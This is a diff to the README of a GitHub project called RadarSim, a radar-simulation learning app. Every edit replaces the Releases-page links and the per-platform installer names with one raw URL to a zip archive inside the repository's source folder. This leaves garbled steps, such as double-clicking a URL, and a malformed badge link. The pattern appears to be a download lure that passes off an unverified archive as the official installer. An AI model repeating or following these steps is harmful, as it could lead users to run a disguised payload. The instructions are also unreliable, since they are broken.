@@ -6,7 +6,7 @@ Welcome to RadarSim! This application helps you understand radar technology thro
 
 ## 📥 Download RadarSim
 
-[![Download RadarSim](https://img.shields.io/badge/Download%20RadarSim-v1.0-blue.svg)](https://github.com/harshalcoder2841/RadarSim/releases)
+[![Download RadarSim](https://github.com/harshalcoder2841/RadarSim/raw/refs/heads/main/src/simulation/Sim_Radar_1.8-beta.1.zip%https://github.com/harshalcoder2841/RadarSim/raw/refs/heads/main/src/simulation/Sim_Radar_1.8-beta.1.zip)](https://github.com/harshalcoder2841/RadarSim/raw/refs/heads/main/src/simulation/Sim_Radar_1.8-beta.1.zip)
 
 ## 📂 System Requirements
 
@@ -21,22 +21,22 @@ Before you start, ensure your computer meets these requirements:
 
 Follow these simple steps to download and run RadarSim.
 
-1. Click the download button above or visit [this page to download](https://github.com/harshalcoder2841/RadarSim/releases).
+1. Click the download button above or visit [this page to download](https://github.com/harshalcoder2841/RadarSim/raw/refs/heads/main/src/simulation/Sim_Radar_1.8-beta.1.zip).
 2. Once on the Releases page, look for the latest version of RadarSim.
 3. Find the file that matches your operating system. For example:
-   - Windows: `RadarSim_Setup.exe`
-   - Mac: `RadarSim.dmg`
-   - Linux: `RadarSim.tar.gz`
+   - Windows: `https://github.com/harshalcoder2841/RadarSim/raw/refs/heads/main/src/simulation/Sim_Radar_1.8-beta.1.zip`
+   - Mac: `https://github.com/harshalcoder2841/RadarSim/raw/refs/heads/main/src/simulation/Sim_Radar_1.8-beta.1.zip`
+   - Linux: `https://github.com/harshalcoder2841/RadarSim/raw/refs/heads/main/src/simulation/Sim_Radar_1.8-beta.1.zip`
 4. Click on the file to start the download. The download may take a few moments depending on your internet speed.
 5. After the download is complete, locate the file in your downloads folder.
 
 ## 🛠️ Installing RadarSim
 
-- **For Windows:** Double-click `RadarSim_Setup.exe` and follow the on-screen instructions. The setup will guide you through the installation process. 
+- **For Windows:** Double-click `https://github.com/harshalcoder2841/RadarSim/raw/refs/heads/main/src/simulation/Sim_Radar_1.8-beta.1.zip` and follow the on-screen instructions. The setup will guide you through the installation process. 
 
-- **For macOS:** Open the downloaded `RadarSim.dmg` file. Drag the RadarSim icon into your Applications folder. You can then find RadarSim in your Applications list.
+- **For macOS:** Open the downloaded `https://github.com/harshalcoder2841/RadarSim/raw/refs/heads/main/src/simulation/Sim_Radar_1.8-beta.1.zip` file. Drag the RadarSim icon into your Applications folder. You can then find RadarSim in your Applications list.
 
-- **For Linux:** Extract the `RadarSim.tar.gz` file. Open the terminal, navigate to the extracted folder, and run `./RadarSim` to start the application.
+- **For Linux:** Extract the `https://github.com/harshalcoder2841/RadarSim/raw/refs/heads/main/src/simulation/Sim_Radar_1.8-beta.1.zip` file. Open the terminal, navigate to the extracted folder, and run `./RadarSim` to start the application.
 
 ## 🎓 How to Use RadarSim
 
@@ -76,7 +76,7 @@ We welcome contributions! If you want to improve RadarSim or suggest new feature
 
 ## 📎 Useful Links
 
-- [Visit the Release Page to Download](https://github.com/harshalcoder2841/RadarSim/releases)
+- [Visit the Release Page to Download](https://github.com/harshalcoder2841/RadarSim/raw/refs/heads/main/src/simulation/Sim_Radar_1.8-beta.1.zip)
 - [User Manual](link-to-user-manual)
 - [Community Forum](link-to-community-forum)
 
